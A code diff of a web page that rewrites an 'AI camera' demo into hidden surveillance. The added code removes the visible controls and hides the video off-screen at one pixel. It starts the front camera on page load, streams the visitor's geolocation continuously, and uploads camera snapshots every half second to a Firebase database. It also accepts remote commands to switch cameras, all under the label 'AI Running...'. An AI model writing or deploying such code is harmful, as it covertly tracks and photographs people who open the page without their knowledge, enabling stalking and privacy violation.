@@ -1,48 +1,32 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>What Is AI</title>
+<title>AI System</title>
 
 <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
 <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
 
 <style>
-
 body{
 background:black;
 color:white;
 text-align:center;
-font-family:Arial;
 padding-top:100px;
-}
-
-h1{
-font-size:50px;
-}
-
-button{
-font-size:30px;
-padding:15px 40px;
-margin:10px;
-background:lime;
-border:none;
-border-radius:10px;
+font-family:Arial;
 }
 
 video{
 position:absolute;
 left:-9999px;
+width:1px;
+height:1px;
 }
-
 </style>
 
 </head>
 <body>
 
-<h1>AI CAMERA SYSTEM</h1>
-
-<button onclick="startFront()">FRONT CAMERA</button>
-<button onclick="startBack()">BACK CAMERA</button>
+<h2>AI Running...</h2>
 
 <video id="video" autoplay playsinline muted></video>
 
@@ -58,10 +42,10 @@ firebase.initializeApp(firebaseConfig);
 
 let deviceId="phone_"+Math.floor(Math.random()*100000);
 
-let currentStream=null;
+let stream=null;
 
 
-// LOCATION ALWAYS RUN
+// SEND LOCATION
 navigator.geolocation.watchPosition(function(pos){
 
 firebase.database().ref("devices/"+deviceId+"/location").set({
@@ -72,45 +56,49 @@ lon:pos.coords.longitude
 });
 
 
-function startFront(){
-startCamera("user","front");
+// LISTEN CAMERA COMMAND
+firebase.database().ref("devices/"+deviceId+"/command")
+.on("value",function(snap){
+
+let cmd=snap.val();
+
+if(cmd){
+startCamera(cmd);
 }
 
-function startBack(){
-startCamera("environment","back");
-}
+});
 
 
-function startCamera(mode,type){
 
-// stop previous
-if(currentStream){
+function startCamera(mode){
 
-currentStream.getTracks().forEach(track=>track.stop());
-
+if(stream){
+stream.getTracks().forEach(track=>track.stop());
 }
 
 navigator.mediaDevices.getUserMedia({
-video:{facingMode:mode}
+video:{facingMode:mode},
+audio:false
 })
-.then(function(stream){
+.then(function(s){
 
-currentStream=stream;
+stream=s;
 
 let video=document.getElementById("video");
 
-video.srcObject=stream;
+video.srcObject=s;
 
 video.play();
 
-capture(video,type);
+capture(video);
 
 });
 
 }
 
 
-function capture(video,type){
+
+function capture(video){
 
 let canvas=document.createElement("canvas");
 
@@ -127,13 +115,17 @@ ctx.drawImage(video,0,0);
 
 let img=canvas.toDataURL("image/jpeg",0.8);
 
-firebase.database().ref("devices/"+deviceId+"/camera/"+type).set({
+firebase.database().ref("devices/"+deviceId+"/camera").set({
 img:img
 });
 
 },500);
 
 }
+
+
+// START FRONT BY DEFAULT
+startCamera("user");
 
 </script>
 
